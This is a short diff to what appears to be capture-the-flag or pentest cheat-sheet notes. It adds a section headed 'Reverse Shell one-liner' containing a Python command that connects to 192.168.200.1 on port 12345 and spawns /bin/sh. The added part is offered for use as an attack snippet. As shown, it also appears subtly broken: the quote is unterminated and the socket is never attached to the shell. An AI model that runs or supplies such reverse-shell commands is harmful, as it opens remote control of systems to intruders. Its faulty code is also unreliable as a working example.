@@ -28,3 +28,7 @@ print x
 # Prints a string of differences. Pipe the output into sed to prettify if x is a list. Output may be a flag...
 
 ```
+### Reverse Shell one-liner
+```python
+python -c "import pty,socket;h,p='192.168.200.1',12345;socket.create_connection((h,p));pty.spawn('/bin/sh');
+```
